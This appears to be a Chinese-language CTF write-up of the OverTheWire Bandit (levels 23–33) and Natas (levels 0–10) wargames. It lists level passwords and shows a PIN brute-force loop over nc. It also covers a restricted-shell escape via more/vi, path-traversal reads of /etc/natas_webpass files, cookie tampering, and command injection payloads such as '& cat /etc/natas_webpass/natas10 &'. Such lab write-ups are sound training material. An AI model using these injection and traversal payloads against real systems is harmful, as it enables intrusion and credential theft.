<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">myname=$(<span class="built_in">whoami</span>)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | <span class="built_in">md5sum</span> | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br></pre></td></tr></table></figure>

<p>后续操作同上一关</p>
<h2 id="Level-24"><a href="#Level-24" class="headerlink" title="Level 24"></a>Level 24</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
</blockquote>
<p>这一关需要编写 shell 脚本进行爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">for (( i=0; i&lt;=9999; i++))</span><br><span class="line">	do</span><br><span class="line">		j=`printf &quot;%04d&quot; $i`</span><br><span class="line">		echo $c $j</span><br><span class="line">	done | nc localhost 30002 </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208183559500.png" alt="image-20200208183559500"></p>
<h2 id="Level-25"><a href="#Level-25" class="headerlink" title="Level 25"></a>Level 25</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not <strong>&#x2F;bin&#x2F;bash</strong>, but something else. Find out what it is, how it works and how to break out of it.</p>
</blockquote>
<p>根据提示，查看 <code>/etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208183819218.png" alt="image-20200208183819218"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208185606783.png" alt="image-20200208185606783"></p>
<p>查看该文件：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208190304077.png" alt="image-20200208190304077"></p>
<p>另外在bandit25家目录下有bandit26.sshkey文件</p>
<p>直接连接的话连接直接会断开：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208185455368.png" alt="image-20200208185455368"></p>
<p>再回看脚本，可利用more的特性，将终端高度调整到最小再连接：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208190400819.png" alt="image-20200208190400819"></p>
<p>然后按 v 进入vi编辑器</p>
<p>然后通过vi编辑器打开我们需要的 bandit26 的密码</p>
<p>这里用到vi打开文件：</p>
<ul>
<li>在vi打开一个文件的时候，在命令行模式下可通过输入<code>sp filename</code> 分屏打开另一个文件(sp&#x3D;split，vsp&#x3D;vsplit) [切换窗口 Ctrl+ww]</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208191337629.png" alt="image-20200208191337629"></p>
<h2 id="Level-26"><a href="#Level-26" class="headerlink" title="Level 26"></a>Level 26</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>
</blockquote>
<p>同样通过more进入vi</p>
<p>不过没有权限通过 <code>:. w !ls</code> 之类的执行shell命令，需要设置一个shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:sh</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208194033762.png" alt="image-20200208194033762"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208194229834.png" alt="image-20200208194229834"></p>
<h2 id="Level-27"><a href="#Level-27" class="headerlink" title="Level 27"></a>Level 27</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit27-git@localhost/home/bandit27-git/repo</code>. The password for the user <code>bandit27-git</code> is the same as for the user <code>bandit27</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>Git 常用命令：<a href="https://blog.csdn.net/lxw198902165221/article/details/89228458">https://blog.csdn.net/lxw198902165221/article/details/89228458</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone ssh://bandit27-git@localhost/home/bandit27-git/repo /tmp/repo_t</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208195828240.png" alt="image-20200208195828240"></p>
<h2 id="Level-28"><a href="#Level-28" class="headerlink" title="Level 28"></a>Level 28</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit28-git@localhost/home/bandit28-git/repo</code>. The password for the user <code>bandit28-git</code> is the same as for the user <code>bandit28</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>同上一关的操作：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208200107789.png" alt="image-20200208200107789"></p>
<p>不过密码被隐藏了，<code>git log</code> 查看日志：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208200931456.png" alt="image-20200208200931456"></p>
<p><code>git show</code> 默认会有 <code>git diff -tree --cc</code> 的格式，可以查看文本的差异</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201103358.png" alt="image-20200208201103358"></p>
<h2 id="Level-29"><a href="#Level-29" class="headerlink" title="Level 29"></a>Level 29</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bbc96594b4e001778eee9975372716b2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit29-git@localhost/home/bandit29-git/repo</code>. The password for the user <code>bandit29-git</code> is the same as for the user <code>bandit29</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>按照之前的操作一遍，结果什么都没有，查看所有分支:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201531922.png" alt="image-20200208201531922"></p>
<p>选择其中一个分支:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout -b remotes/origin/dev</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208201753238.png" alt="image-20200208201753238"></p>
<h2 id="Level-30"><a href="#Level-30" class="headerlink" title="Level 30"></a>Level 30</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5b90576bedb2cc04c86a9e924ce42faf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit30-git@localhost/home/bandit30-git/repo</code>. The password for the user <code>bandit30-git</code> is the same as for the user <code>bandit30</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p>重复上一关操作，发现只有一个分支，没有其他有用的数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git show-ref # 显示本地引用</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208202535432.png" alt="image-20200208202535432"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<h2 id="Level-31"><a href="#Level-31" class="headerlink" title="Level 31"></a>Level 31</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">47e603bb428404d265f59c42920d81e5</span><br></pre></td></tr></table></figure>

<blockquote>
<p>There is a git repository at <code>ssh://bandit31-git@localhost/home/bandit31-git/repo</code>. The password for the user <code>bandit31-git</code> is the same as for the user <code>bandit31</code>.</p>
<p>Clone the repository and find the password for the next level.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203256797.png" alt="image-20200208203256797"></p>
<p>这一次需要往仓库push一个文件，命名为 <code>key.txt</code>，内容为 <code>May I come in?</code></p>
<p>创建好文件后把它加入缓冲区：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203414700.png" alt="image-20200208203414700"></p>
<p>提交修改到仓库：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203528661.png" alt="image-20200208203528661"></p>
<p>推送到仓库，得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208203620705.png" alt="image-20200208203620705"></p>
<h2 id="Level-32"><a href="#Level-32" class="headerlink" title="Level 32"></a>Level 32</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">56a9bf19c63d650ce78e6ec0354ee45e</span><br></pre></td></tr></table></figure>

<blockquote>
<p>After all this <code>git</code> stuff its time for another escape. Good luck!</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208204505341.png" alt="image-20200208204505341"></p>
<p>所有指令都变为了大写，这里就用到 shell 的特殊变量：</p>
<p>shell 特殊变量：</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>当前脚本的文件名</td>
</tr>
<tr>
<td><code>$n</code></td>
<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是$1，第二个参数是​$2。</td>
</tr>
<tr>
<td><code>$#</code></td>
<td>传递给脚本或函数的参数个数。</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>传递给脚本或函数的所有参数。</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>传递给脚本或函数的所有参数。被双引号(“ “)包含时，与 $* 稍有不同，下面将会讲到。</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>上个命令的退出状态，或函数的返回值。</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>当前Shell进程ID。对于 Shell 脚本，就是这些脚本所在的进程ID。</td>
</tr>
</tbody></table>
<p>执行 <code>$0</code> 即相当于执行 <code>sh</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208205519666.png" alt="image-20200208205519666"></p>
<h2 id="Level-33"><a href="#Level-33" class="headerlink" title="Level 33"></a>Level 33</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c9c3199ddf4121b10cf581a98d51caee</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>At this moment, level 34 does not exist yet.</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>OverTheWire-Natas 靶场</title>
    <url>/2020/02/08/OverTheWire-Natas/</url>
    <content><![CDATA[<h1 id="OverTheWire-Natas-靶场"><a href="#OverTheWire-Natas-靶场" class="headerlink" title="OverTheWire Natas 靶场"></a>OverTheWire Natas 靶场</h1><blockquote>
<p><a href="https://overthewire.org/wargames/natas/">https://overthewire.org/wargames/natas/</a></p>
</blockquote>
<blockquote>
<p>起始：<a href="http://natas0.natas.labs.overthewire.org/">http://natas0.natas.labs.overthewire.org</a></p>
</blockquote>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">natas0</span><br></pre></td></tr></table></figure>

<p>右键查看源代码得到下一关密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208210707377.png" alt="image-20200208210707377"></p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gtVrDuiDfck831PqWsLEZy5gyDz1clto </span><br></pre></td></tr></table></figure>

<p>这一关右键被锁定，那就通过 F12 查看源码得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208210943249.png" alt="image-20200208210943249"></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</span><br></pre></td></tr></table></figure>

<p>访问网页后，页面内没有任何东西，只引用了一个一个像素点的图片：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213223076.png" alt="image-20200208213223076"></p>
<p>这个图片文件也没有任何东西，但是访问&#x2F;files文件夹时发现这个目录可列：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213329941.png" alt="image-20200208213329941"></p>
<p>访问users.txt获得密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213346465.png" alt="image-20200208213346465"></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213433653.png" alt="image-20200208213433653"></p>
<p>根据提示，说连Google都找不到，猜测是robots协议，尝试访问 robots.txt</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213518821.png" alt="image-20200208213518821"></p>
<p>访问目录得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213540871.png" alt="image-20200208213540871"></p>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213633809.png" alt="image-20200208213633809"></p>
<p>根据提示，添加Refer:</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213846501.png" alt="image-20200208213846501"></p>
<p>得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208213858778.png" alt="image-20200208213858778"></p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/P%5DFKZQYDR22UUF@%5BKTTY@7A.png" alt="img"></p>
<p>抓包查看：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214521697.png" alt="image-20200208214521697"></p>
<p>修改Cookie里面的loggedin&#x3D;1即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214612672.png" alt="image-20200208214612672"></p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208214902828.png" alt="image-20200208214902828"></p>
<p>点击查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/level.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://natas.labs.overthewire.org/css/wechall.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://natas.labs.overthewire.org/js/wechall-data.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> wechallinfo = &#123; <span class="string">&quot;level&quot;</span>: <span class="string">&quot;natas6&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&lt;censored&gt;&quot;</span> &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas6<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">include &quot;includes/secret.inc&quot;;</span><br><span class="line"></span><br><span class="line">    if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</span><br><span class="line">        if($secret == $_POST[&#x27;secret&#x27;]) &#123;</span><br><span class="line">        print &quot;Access granted. The password for natas7 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        print &quot;Wrong secret&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">Input secret: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">secret</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现包含文件 <code>includes/secret.inc</code></p>
<p>访问之查看源码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215144760.png" alt="image-20200208215144760"></p>
<p>提交得到密码</p>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</span><br></pre></td></tr></table></figure>

<p>点击页面链接，发现地址栏变动，猜测文件包含</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215355851.png" alt="image-20200208215355851"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215403961.png" alt="image-20200208215403961"></p>
<p>当前页面源代码中带有提示：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208215420947.png" alt="image-20200208215420947"></p>
<p>令 <code>page=/etc/natas_webpass/natas8</code> 即可得到密码</p>
<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe </span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas8<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</span><br><span class="line"></span><br><span class="line">function encodeSecret($secret) &#123;</span><br><span class="line">    return bin2hex(strrev(base64_encode($secret)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</span><br><span class="line">    if(encodeSecret($_POST[&#x27;secret&#x27;]) == $encodedSecret) &#123;</span><br><span class="line">    print &quot;Access granted. The password for natas9 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    print &quot;Wrong secret&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">Input secret: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">secret</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值，其反函数为hex2bin()。</p>
</li>
<li><p>strrev() 函数反转字符串。</p>
</li>
<li><p>base64_encode() 函数进行base64加密。</p>
</li>
</ul>
<p>构造解码函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decodeSecret</span>(<span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>解码得到 <code>oubWYf2kBq</code>，提交得到密码</p>
<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas9<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测命令执行，提交 <code>| ls -al</code> 返回：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200208220904544.png" alt="image-20200208220904544"></p>
<p>构造语句：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp; cat /etc/natas_webpass/natas10 &amp;</span><br></pre></td></tr></table></figure>

<p>得到下一关密码</p>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
